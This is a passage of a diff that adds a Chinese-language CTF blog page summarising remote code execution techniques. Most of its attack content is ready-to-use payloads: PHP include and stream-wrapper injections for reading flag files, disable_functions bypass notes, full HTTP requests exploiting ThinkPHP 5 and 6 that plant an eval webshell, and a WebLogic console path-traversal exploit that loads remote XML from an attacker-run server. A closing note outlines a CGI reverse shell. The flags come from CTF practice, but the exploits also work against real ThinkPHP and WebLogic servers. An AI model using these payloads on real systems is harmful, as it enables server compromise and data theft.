+<li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;不用分号</li>
+<li>GET：?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</li>
+<li>POST：<?php system('tac flag.php');?></li>
+<li>c&#x3D;include(‘flag.php’);echo $flag;</li>
+<li>c&#x3D;include($_GET[‘1’]); ?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</li>
+<li>c&#x3D;include(‘flag.php’);var_dump(get_defined_vars());		&#x2F;&#x2F;var_dump:输出注册变量&#x2F;&#x2F;get_defined_vars():函数返回由所有已定义变量所组成的数组</li>
+<li>c&#x3D;include(‘&#x2F;flag.txt’);var_export(get_defined_vars());</li>
+<li>c&#x3D;include(“&#x2F;flag.txt”);$ss&#x3D;ob_get_contents();ob_end_clean();echo $ss;</li>
+<li>c&#x3D;include(‘&#x2F;flag.txt’);var_export(get_defined_vars());exit();</li>
+<li>或者</li>
+<li>c&#x3D;include(‘&#x2F;flag.txt’);var_export(get_defined_vars());die();</li>
+<li>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}die();</li>
+<li>或者</li>
+<li>c&#x3D;var_export(glob(‘&#x2F;*’));die();</li>
+</ul>
+</li>
+<li><code>include &quot;flag.php&quot;;</code>，这里面应该有flag变量，用<a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-get_defined_vars-function.html">get_defined_vars()</a> 函数+var_dump全部输出出来。<ul>
+<li>var_dump(get_defined_vars());</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="system"><a href="#system" class="headerlink" title="system();"></a>system();</h2><ul>
+<li>tac \find &#x2F; -inum 3673632<ul>
+<li>printf &#x2F;fla &gt; &#x2F;tmp&#x2F;zer0b</li>
+<li>printf g &gt;&gt; &#x2F;tmp&#x2F;zer0b</li>
+<li>tac `tac &#x2F;tmp&#x2F;zer0b</li>
+</ul>
+</li>
+</ul>
+<h2 id="补充：封装协议的利用"><a href="#补充：封装协议的利用" class="headerlink" title="补充：封装协议的利用"></a>补充：封装协议的利用</h2><ul>
+<li>fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数stream_wrapper_register() </li>
+<li>php:&#x2F;&#x2F;input   allow_url_include选项必须设置为on，否则无法成功,allow_url_fopen是否开启无关紧要。php:&#x2F;&#x2F;input是用来接收post数据的当enctype&#x3D;”multipart&#x2F;form-data”的时候php:&#x2F;&#x2F;input是无效php:&#x2F;&#x2F;input 用于 application&#x2F;x-www-form-urlencoded 或 text&#x2F;plain 编码类型的表单数据。<ul>
+<li>例子：文件包含</li>
+</ul>
+</li>
+<li>data:&#x2F;&#x2F;       allow_url_include与allow_url_fopen选项必须设置为on<ul>
+<li>用法：<ul>
+<li>data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo()?></li>
+<li>data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</li>
+<li>或者：</li>
+<li>data:text&#x2F;plain,<?php phpinfo()?></li>
+<li>data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="disable-functions是php-ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数"><a href="#disable-functions是php-ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数" class="headerlink" title="disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数"></a>disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数</h2><ul>
+<li>为了安全,运维人员会禁用PHP的一些“危险”函数,将其写在php.ini配置文件中,就是我们所说的disable_functions了。</li>
+<li>disable_functions是一个黑名单机制，如果在渗透时已经上传了webshell却因为disable_functions导致我们无法进行命令执行，这时候就需要去进行一个绕过。</li>
+</ul>
+<h3 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h3><ul>
+<li>PoC<ul>
+<li>禁用了常见的命令执行函数如system、exec、passthru但不能禁用所有函数（例如，如果禁用了stream_filter_register或类似函数，这个PoC可能无法执行）。</li>
+<li>PoC主要针对Unix-like系统（Linux、macOS等），因为它依赖于底层的内存管理特性，这在不同操作系统之间可能有所不同。</li>
+<li>没有启用诸如open_basedir等限制性配置</li>
+<li>没有启用safe_mode（虽然safe_mode在PHP 5.4中被移除，但在某些环境中仍可能会影响漏洞利用）。</li>
+<li>服务器配置允许使用php:&#x2F;&#x2F;memory等流包装器。</li>
+<li>上传PoC.php最后访问PoC.php获取flag</li>
+</ul>
+</li>
+</ul>
+<h3 id="利用-LD-PRELOAD突破"><a href="#利用-LD-PRELOAD突破" class="headerlink" title="利用[LD_PRELOAD突破"></a>利用[LD_PRELOAD突破</h3><ul>
+<li>找到“绕过disable_funtions“，在刚刚连接上的shell右键-&gt;加载插件-&gt;辅助工具-&gt;绕过disable_functions。模式选择<code>PHP7_GC_UAF</code>再点击开始，就能执行命令了</li>
+</ul>
+<h3 id="利用Windows组件COM绕过"><a href="#利用Windows组件COM绕过" class="headerlink" title="利用Windows组件COM绕过"></a>利用Windows组件COM绕过</h3><ul>
+<li>查看com.allow_dcom是否开启,这个默认是不开启的。</li>
+<li>上传 EXP 脚本</li>
+<li><a target="_blank" rel="noopener" href="http://target.com/uploads/com.php%EF%BC%9Fcmd=whoami">http://target.com/uploads/com.php？cmd=whoami</a></li>
+</ul>
+<h3 id="利用PHP7-4-FFI绕过"><a href="#利用PHP7-4-FFI绕过" class="headerlink" title="利用PHP7.4 FFI绕过"></a>利用PHP7.4 FFI绕过</h3><h3 id="ThinkPHP-5-的远程代码执行（RCE）"><a href="#ThinkPHP-5-的远程代码执行（RCE）" class="headerlink" title="ThinkPHP 5 的远程代码执行（RCE）"></a>ThinkPHP 5 的远程代码执行（RCE）</h3><ul>
+<li>POST &#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1</li>
+<li>Host: IP:PORT</li>
+<li>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0</li>
+<li>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</li>
+<li>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</li>
+<li>Accept-Encoding: gzip, deflate</li>
+<li>Connection: close</li>
+<li>Upgrade-Insecure-Requests: 1</li>
+<li>Pragma: no-cache</li>
+<li>Cache-Control: no-cache</li>
+<li>Content-Type: application&#x2F;x-www-form-urlencoded</li>
+<li>Content-Length: 79<ul>
+<li>_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</li>
+</ul>
+</li>
+</ul>
+<h3 id="tp6rce"><a href="#tp6rce" class="headerlink" title="tp6rce"></a>tp6rce</h3><ul>
+<li>@Session::set(‘user’,$_GET[‘username’]);</li>
+<li>访问会看到session设置，构造数据包如下</li>
+<li>GET &#x2F;public&#x2F;index.php?username&#x3D;<?php+eval($_GET[1]);?> HTTP&#x2F;1.1</li>
+<li>Host: IP:PORT</li>
+<li>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0</li>
+<li>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</li>
+<li>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</li>
+<li>Accept-Encoding: gzip, deflate</li>
+<li>Connection: close</li>
+<li>Cookie: PHPSESSID&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;public&#x2F;111111112.php</li>
+<li>Upgrade-Insecure-Requests: 1</li>
+<li>接着访问<code>http://IP:PORT/public/111111112.php?1=system(%22cat%20/flag%22);</code></li>
+</ul>
+<h3 id="WebLogic-服务器的漏洞利用"><a href="#WebLogic-服务器的漏洞利用" class="headerlink" title="WebLogic 服务器的漏洞利用"></a>WebLogic 服务器的漏洞利用</h3><ul>
+<li>WebLogic控制台必须对外暴露，并且可以通过 <a href="http://IP:PORT/console">http://IP:PORT/console</a> 访问</li>
+<li>10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3WebLogic服务器使用了受影响的Spring Framework组件，该组件的 FileSystemXmlApplicationContext 允许通过URL加载远程的XML配置文件。如果目标服务器未使用或已修复相关漏洞，该攻击将失效。攻击者能控制远程文件</li>
+<li>访问<code>http://IP:PORT/console</code>到登录页面</li>
+<li>接着访问<code>http://IP:PORT/console/css/%252e%252e%252fconsole.portal</code>（这里最好抓包修改）</li>
+<li>接着在本地用python起一个HTTP服务，HTTP下放置weblogic.xml</li>
+<li><pre><code class="python">python3 -m http.server 8001
+
+      接着访问`http://IP:PORT/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://ip:8001/weblogic.xml&quot;)`
+      短rce？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
+          形如`$&#123;_GET&#125;&#123;%f8&#125;();&amp;%f8=cmd`的payload需要的代码量最少且功能齐全，
+</code></pre>
+</li>
+</ul>
+<hr>
+<p>Metasploit Framework包含了可以检测和利用CGI漏洞的模块<br>检查环境：确保服务器允许执行CGI脚本、当前目录可写，并且.htaccess文件有效。<br>创建脚本：在服务器上创建一个脚本，这个脚本会连接到攻击者指定的IP地址，并给攻击者提供一个Shell访问。<br>执行脚本：通过修改.htaccess文件，确保这个脚本可以执行，然后运行它。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://theganlove.github.io/2024/09/01/rce%E6%80%BB%E7%BB%93/" data-id="cm0kwqysv000g64dkf3443yv9" data-title="rce总结" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/09/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%AF%87/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          文件操作篇
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/08/31/%E8%89%BA%E6%9C%AF/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">艺术</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/">CTF-web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/php%E5%AE%A1%E8%AE%A1/">php审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/rce/">rce</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">文件操作</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%89%BA%E6%9C%AF/">艺术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%A9%E5%91%BD%E6%8B%82%E6%99%93/">革命拂晓</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%97%E6%84%9F%E6%82%9F/" rel="tag">文字感悟</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83/" rel="tag">环境</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E5%B7%B1%E7%9A%84%E8%89%BA%E6%9C%AF/" rel="tag">自己的艺术</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/web-php/" style="font-size: 20px;">web php</a> <a href="/tags/%E6%96%87%E5%AD%97%E6%84%9F%E6%82%9F/" style="font-size: 10px;">文字感悟</a> <a href="/tags/%E7%8E%AF%E5%A2%83/" style="font-size: 15px;">环境</a> <a href="/tags/%E8%87%AA%E5%B7%B1%E7%9A%84%E8%89%BA%E6%9C%AF/" style="font-size: 10px;">自己的艺术</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/">August 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/09/01/%E9%9A%90%E5%86%99%E7%B3%BB%E5%88%97/">隐写系列</a>
+          </li>
+        
+          <li>
+            <a href="/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/">脚本工具</a>
+          </li>
+        
+          <li>
+            <a href="/2024/09/01/ssrf/">ssrf</a>
+          </li>
+        
+          <li>
+            <a href="/2024/09/01/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/">jwt等认证went</a>
+          </li>
+        
+          <li>
+            <a href="/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">js原型链污染</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
